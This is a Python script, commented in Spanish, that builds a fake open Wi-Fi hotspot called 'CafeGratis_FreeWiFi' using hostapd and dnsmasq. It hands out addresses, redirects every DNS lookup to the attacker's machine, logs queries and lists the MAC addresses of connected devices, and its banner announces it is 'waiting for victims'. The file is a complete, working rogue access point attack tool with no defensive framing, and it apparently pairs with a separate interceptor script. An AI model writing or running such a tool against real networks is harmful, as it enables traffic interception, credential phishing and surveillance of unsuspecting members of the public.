#!/usr/bin/env python3
"""
QUANTUM-HIJACK - ENTANGLEMENT PHASE
Crea WiFi falso abierto + DHCP automático
SSID: CafeGratis_FreeWiFi (sin contraseña)
"""

import subprocess
import time
import os
import signal
import sys

# Variables globales
hostapd_proc = None
dnsmasq_proc = None
monitor_iface = None
wifi_iface = None

def cleanup(signum, frame):
    """Limpia recursos al salir"""
    global hostapd_proc, dnsmasq_proc, monitor_iface, wifi_iface
    
    print("\n\n[!] Deteniendo ENTANGLEMENT...")
    
    # Matar procesos
    if hostapd_proc:
        hostapd_proc.terminate()
        try:
            hostapd_proc.wait(timeout=3)
        except:
            hostapd_proc.kill()
        print("[✓] Hostapd detenido")
    
    if dnsmasq_proc:
        dnsmasq_proc.terminate()
        try:
            dnsmasq_proc.wait(timeout=3)
        except:
            dnsmasq_proc.kill()
        print("[✓] Dnsmasq detenido")
    
    # Kill por nombre también
    subprocess.run(["pkill", "-f", "hostapd"], capture_output=True)
    subprocess.run(["pkill", "-f", "dnsmasq"], capture_output=True)
    time.sleep(1)
    
    # Quitar IP de la interfaz
    if monitor_iface:
        subprocess.run(["sudo", "ip", "addr", "flush", "dev", monitor_iface], 
                      capture_output=True)
    
    # Quitar modo monitor
    if wifi_iface and monitor_iface:
        print("[*] Quitando modo monitor...")
        subprocess.run(["sudo", "airmon-ng", "stop", monitor_iface], 
                      capture_output=True)
        print("[✓] Modo monitor desactivado")
    
    print("[✓] Cleanup completado")
    sys.exit(0)

# Registrar signal handlers
signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def load_interfaces():
    """Carga interfaces del archivo setup.sh"""
    global monitor_iface, wifi_iface
    
    try:
        if os.path.exists('.monitor_iface'):
            with open('.monitor_iface', 'r') as f:
                monitor_iface = f.read().strip()
        if os.path.exists('.wifi_iface'):
            with open('.wifi_iface', 'r') as f:
                wifi_iface = f.read().strip()
    except:
        pass
    
    if not monitor_iface:
        monitor_iface = "wlan0mon"
    if not wifi_iface:
        wifi_iface = "wlan0"
    
    print(f"[+] Usando interfaz monitor: {monitor_iface}")
    print(f"[+] Usando interfaz WiFi: {wifi_iface}")

def create_configs():
    """Crea archivos de configuración"""
    
    # Crear hostapd.conf para WiFi ABIERTO (sin contraseña)
    hostapd_conf = f"""interface={monitor_iface}
ssid=CafeGratis_FreeWiFi
hw_mode=g
channel=6
wmm_enabled=1
ieee80211n=1
max_num_sta=100
ignore_broadcast_ssid=0
"""
    
    with open('hostapd_entangle.conf', 'w') as f:
        f.write(hostapd_conf)
    
    print("[✓] hostapd_entangle.conf creado")
    
    # Crear dnsmasq.conf para DHCP
    dnsmasq_conf = f"""interface={monitor_iface}
dhcp-range=192.168.1.2,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
log-queries
log-facility=/tmp/dnsmasq_hijack.log
"""
    
    with open('dnsmasq_entangle.conf', 'w') as f:
        f.write(dnsmasq_conf)
    
    print("[✓] dnsmasq_entangle.conf creado")

def start_entanglement():
    """Inicia WiFi falso + DHCP"""
    global hostapd_proc, dnsmasq_proc, monitor_iface
    
    print(f"\n[*] Configurando IP en {monitor_iface}...")
    subprocess.run(["sudo", "ip", "addr", "add", "192.168.1.1/24", "dev", monitor_iface],
                  capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", "dev", monitor_iface, "up"],
                  capture_output=True)
    print("[✓] IP configurada: 192.168.1.1/24")
    
    # Habilitar forward y NAT (opcional para internet)
    print("[*] Configurando iptables para NAT...")
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
                  capture_output=True)
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", 
                   f"-o", "eth0", "-j", "MASQUERADE"],
                  capture_output=True, stderr=subprocess.DEVNULL)
    print("[✓] NAT habilitado")
    
    print(f"\n[*] Iniciando DHCP Server...")
    try:
        dnsmasq_proc = subprocess.Popen(
            ["sudo", "dnsmasq", "-C", "dnsmasq_entangle.conf", "-d"],
            stdout=open("/tmp/dnsmasq_hijack.log", "w"),
            stderr=subprocess.STDOUT
        )
        print("[✓] Dnsmasq iniciado")
    except Exception as e:
        print(f"[✗] Error en dnsmasq: {e}")
    
    time.sleep(2)
    
    print(f"\n[*] Iniciando WiFi falso (CafeGratis_FreeWiFi)...")
    try:
        hostapd_proc = subprocess.Popen(
            ["sudo", "hostapd", "hostapd_entangle.conf"],
            stdout=open("/tmp/hostapd_hijack.log", "w"),
            stderr=subprocess.STDOUT
        )
        print("[✓] Hostapd iniciado")
    except Exception as e:
        print(f"[✗] Error en hostapd: {e}")
    
    time.sleep(3)

def monitor_clients():
    """Monitorea clientes conectados"""
    while True:
        try:
            result = subprocess.run(
                ["iw", "dev", monitor_iface, "station", "dump"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # Contar estaciones
            connected = result.stdout.count("Station")
            
            # Extraer MACs y IPs
            lines = result.stdout.split('\n')
            macs = [line.split()[1] for line in lines if 'Station' in line]
            
            timestamp = time.strftime('%H:%M:%S')
            print(f"[{timestamp}] 📱 Dispositivos conectados: {connected}", end="")
            
            if macs:
                print(f" | MACs: {', '.join(macs[:3])}", end="")
                if len(macs) > 3:
                    print(f" (+{len(macs)-3} más)", end="")
            
            print()
            
        except Exception as e:
            print(f"[!] Error monitoreando: {e}")
        
        time.sleep(5)

def main():
    """Función principal"""
    
    print("╔════════════════════════════════════════════════════════════╗")
    print("║         🔥 QUANTUM-HIJACK - ENTANGLEMENT PHASE 🔥          ║")
    print("║          Creando WiFi falso + DHCP automático              ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print("")
    
    # Verificar permisos root
    if os.geteuid() != 0:
        print("❌ Este script requiere permisos root")
        print("Ejecuta: sudo python3 entangle.py")
        sys.exit(1)
    
    # Cargar interfaces
    load_interfaces()
    
    # Crear configuraciones
    create_configs()
    
    # Iniciar ENTANGLEMENT
    start_entanglement()
    
    print("\n" + "="*60)
    print("✅ ENTANGLEMENT ACTIVO")
    print("="*60)
    print(f"   🌐 SSID: CafeGratis_FreeWiFi")
    print(f"   🔓 Seguridad: ABIERTA (sin contraseña)")
    print(f"   📡 Canal: 6 (2.4GHz)")
    print(f"   🌍 Gateway: 192.168.1.1")
    print(f"   🔄 DHCP: 192.168.1.2-100")
    print(f"   ⏰ Esperando víctimas...")
    print("="*60)
    print("")
    print("En otra terminal ejecuta:")
    print("  sudo python3 quantum_interceptor.py")
    print("")
    
    # Monitorear clientes
    monitor_clients()

if __name__ == "__main__":
    main()
